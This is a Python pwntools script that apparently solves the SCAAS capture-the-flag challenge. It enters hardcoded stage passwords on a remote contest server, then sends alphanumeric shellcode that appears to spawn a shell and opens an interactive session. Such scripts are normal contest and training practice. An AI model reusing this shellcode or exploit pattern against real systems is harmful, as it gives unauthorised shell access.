from pwn import *
import base64

io = remote('scaas-1.play.hfsc.tf', 1337)
#io = process('./vip')

def sd():
    io.sendlineafter(b'> ', b'1')
    io.recvuntil(b'Here is your SCAAS service: (\n')
    a = io.recvuntil(b'AAA=')
    print(a)
    with open('chall.gzip', 'wb') as f:
        f.write(base64.b64decode(a))


def pwnstg():
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Enter password 0: ', b'9530624')
    io.sendlineafter(b'Enter password 1: ', b'7370775')
    io.sendlineafter(b'Enter password 2: ', b'2')
    io.sendlineafter(b'Enter password 3: ', b'8653762')
    io.sendlineafter(b'Enter password 4: ', b'8987274')
    io.sendlineafter(b'Enter password 0: ', b'1243932')
    io.sendlineafter(b'Enter password 1: ', b'3103430')
    io.sendlineafter(b'Enter password 2: ', b'262049')
    io.sendlineafter(b'Enter password 3: ', b'262505')
    io.sendlineafter(b'Enter password 4: ', b'1')
    io.sendlineafter(b'Enter password 0: ', b'2124890')
    io.sendlineafter(b'Enter password 1: ', b'9874561')
    io.sendlineafter(b'Enter password 2: ', b'6288407')
    io.sendlineafter(b'Enter password 3: ', b'6280405')
    io.sendlineafter(b'Enter password 4: ', b'1445')


def pwn():
    pwnstg()
    #gdb.attach(io)
    sc = b'\x50\x59\x6A\x30\x58\x34\x30\x50\x5A\x48\x66\x35\x73\x4F\x66\x35\x41\x30\x30\x41\x47\x30\x61\x48\x50\x52\x58\x52\x68\x58\x58\x73\x68\x58\x66\x35\x77\x77\x50\x6A\x30\x58\x34\x30\x35\x30\x62\x69\x6E\x48\x50\x54\x58\x52\x51\x53\x50\x54\x55\x56\x57\x61\x50\x59\x53\x34\x4A\x34\x41\x51\x5A'
    print(sc)
    io.sendlineafter(b'Run SCAAS (alphanumeric shellcode, max 500 bytes): ', sc)

pwn()
io.interactive()
